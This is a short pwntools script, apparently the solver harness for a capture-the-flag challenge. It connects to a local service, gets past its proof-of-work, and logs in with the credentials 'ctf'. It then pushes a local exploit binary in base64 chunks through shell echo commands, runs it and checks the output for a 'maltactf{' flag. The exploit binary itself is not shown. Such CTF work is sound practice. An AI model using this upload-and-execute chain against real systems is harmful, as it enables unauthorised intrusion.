#!/usr/bin/env python3
from pwn import *
from http.server import HTTPServer
import time
import base64
import os
import sys

# context.log_level = 'DEBUG'

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

HOST, PORT = "127.0.0.1", 1337


p = remote(HOST, PORT)

p.recvuntil('== proof-of-work: ')
if p.recvline().startswith(b'enabled'):
    handle_pow(p)


p.sendlineafter("login: ", "ctf")
p.sendlineafter("Password: ", "ctf")

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter("$", cmd)
	resp = p.recvuntil("$")

	if print_resp:
		log.info(resp)

	p.unrecv("$")
	return resp

def send_file(src, dst):
	file = read(src)	
	f = b64e(file)

	send_command("rm -f {}.b64".format(dst))
	send_command("rm -f {}".format(dst))

	size = 800
	for i in range(len(f)//size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)//size))
		send_command("echo -n '{}' >> {}.b64".format(f[i*size:(i+1)*size], dst), False)

	send_command("cat {}.b64 | base64 -d > {}".format(dst, dst))

send_file("/home/user/exploit", "/tmp/exploit")
send_command("chmod +x /tmp/exploit")
assert b"maltactf{" in send_command("/tmp/exploit")

p.interactive()
